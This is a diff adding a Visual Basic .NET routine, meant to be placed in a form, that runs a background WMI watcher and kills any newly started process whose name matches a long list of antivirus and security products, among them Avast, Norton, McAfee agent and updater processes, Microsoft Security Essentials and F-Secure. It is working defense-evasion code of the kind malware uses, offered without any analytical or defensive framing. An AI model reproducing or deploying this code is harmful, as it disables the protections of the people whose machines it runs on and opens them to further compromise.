@@ -1,0 +1,204 @@
+Place in form1 
+ Dim procWatcher As New Threading.Thread(AddressOf CreationEventWatcherPolling)
+        procWatcher.Start() 
+
+
+Public Sub CreationEventWatcherPolling()
+
+        ' Create event query to be notified within 1 second of 
+        ' a change in a service
+        Dim query As New WqlEventQuery(
+            "__InstanceCreationEvent",
+            New TimeSpan(0, 0, 1),
+            "TargetInstance isa ""Win32_Process""")
+
+        ' Initialize an event watcher and subscribe to events 
+        ' that match this query
+        Dim watcher As New ManagementEventWatcher(query)
+
+        Do
+            Dim e As ManagementBaseObject =
+                watcher.WaitForNextEvent()
+
+            'block notepad
+            'If CType(e("TargetInstance"),
+            'ManagementBaseObject)("Name").ToString = "notepad.exe" Then
+            'Process.GetProcessById(CType(e("TargetInstance"),
+            'ManagementBaseObject)("Handle")).Kill()
+            ' End If
+
+            'Avast Anti-Virus
+            If CType(e("TargetInstance"),
+                   ManagementBaseObject)("Name").ToString = "ashServ.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'Panda Anti-Virus Titanium
+            If CType(e("TargetInstance"),
+                  ManagementBaseObject)("Name").ToString = "AVENGINE.EXE" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+
+            If CType(e("TargetInstance"),
+                 ManagementBaseObject)("Name").ToString = "avgemc.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'TrendMicro Internet Security
+            If CType(e("TargetInstance"),
+               ManagementBaseObject)("Name").ToString = "tmntsrv.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'Microsoft Security Essentials
+            If CType(e("TargetInstance"),
+              ManagementBaseObject)("Name").ToString = "msmpeng.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'Norton Antivirus
+            If CType(e("TargetInstance"),
+            ManagementBaseObject)("Name").ToString = "navapsvc.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'MicroWorld eScan
+            If CType(e("TargetInstance"),
+          ManagementBaseObject)("Name").ToString = "avkwctl.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'F-Secure Anti-Virus
+            If CType(e("TargetInstance"),
+        ManagementBaseObject)("Name").ToString = "fsav32.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'McAfee | Performs functions such as: Property collection. Policy enforcement.
+            If CType(e("TargetInstance"),
+       ManagementBaseObject)("Name").ToString = "masvc.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'McAfee Managed Mode
+            If CType(e("TargetInstance"),
+      ManagementBaseObject)("Name").ToString = "frminst.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'McAfee | The McShield on-access scanner
+            If CType(e("TargetInstance"),
+      ManagementBaseObject)("Name").ToString = "Mcshield.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'Hosts multiple McAfee Agent services such as peer-to-peer server, wake-up, and RelayServer.
+            If CType(e("TargetInstance"),
+     ManagementBaseObject)("Name").ToString = "macmnsvc.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'This executable is the compatibility service for the McAfee Agent service.
+            'McAfee Agent service starts this service and communicates to the managed product plug-ins.
+            If CType(e("TargetInstance"),
+    ManagementBaseObject)("Name").ToString = "macompatsvc.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'McAfee Agent installation program. 
+            If CType(e("TargetInstance"),
+   ManagementBaseObject)("Name").ToString = "FrmInst.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'A command-line program used to configure different options of McAfee Agent. 
+            If CType(e("TargetInstance"),
+  ManagementBaseObject)("Name").ToString = "maconfig.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'A command-line program used by McScript_InUse.exe to perform DAT or engine updates.
+            If CType(e("TargetInstance"),
+ ManagementBaseObject)("Name").ToString = "McScanCheck.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'Runs scripts for updating DAT files, engines, service packs, or any other component checked in to a repository.
+            'This process loads when update task is started.
+            If CType(e("TargetInstance"),
+ ManagementBaseObject)("Name").ToString = "McScript_InUse.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'McAfee Agent installer.
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "FramePkg.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'Initiates the McAfee® Data Exchange Layer (DXL) client installer as part of McAfee Agent install.
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "mcupdater.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'Provides trust validation for all McAfee processes.
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "mfevtps.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'These are Symantec’s North AnvtiVirus processes.
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "Navapsvc.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'These are Symantec’s North AnvtiVirus processes.
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "nvsrvc32.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'These are Symantec’s North AnvtiVirus processes.
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "navapw32.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            ' Nortons AntiVirus process.
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "savscan.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            'Associated with Symantec’s Internet Security Suite.
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "ccEvtMrg.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            ' Also associated with Symantec’s Internet Security Suite
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "ccSetMgr.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+            '
+            If CType(e("TargetInstance"),
+ManagementBaseObject)("Name").ToString = "ccSetMgr.exe" Then
+                Process.GetProcessById(CType(e("TargetInstance"),
+                    ManagementBaseObject)("Handle")).Kill()
+            End If
+
+
+
+
+        Loop
+
+
+        'Cancel the subscription
+        watcher.Stop()
+
+    End Sub
